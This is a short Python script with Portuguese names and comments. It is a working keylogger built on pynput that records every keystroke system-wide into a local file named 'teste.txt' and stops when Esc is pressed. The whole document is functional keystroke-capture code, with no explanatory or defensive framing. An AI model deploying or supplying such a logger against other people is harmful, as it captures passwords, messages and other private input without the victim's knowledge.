from pynput import keyboard
import re

log = 'teste.txt'

def pressionar(key):
    key = str(key)
    try:
        key = re.sub(r'\'', '', key)
        key = re.sub('Key.enter', '\n', key)
        key = re.sub('Key.space', ' ', key)
        key = re.sub('Key.tab', '\t', key)
        key = re.sub('Key.backspace', 'apagar', key)
        key = re.sub('Key.*', '', key)
        
        with open(log, 'a') as arquivo:
            arquivo.write(key)
                
    except AttributeError:
        pass


def soltar(key):
    if key == keyboard.Key.esc: # PARANDO EXECUÇÃO'
        return False

# COLETANDO EVENTOS
with keyboard.Listener(
        on_press=pressionar,
       on_release=soltar) as listagem:
    listagem.join()
    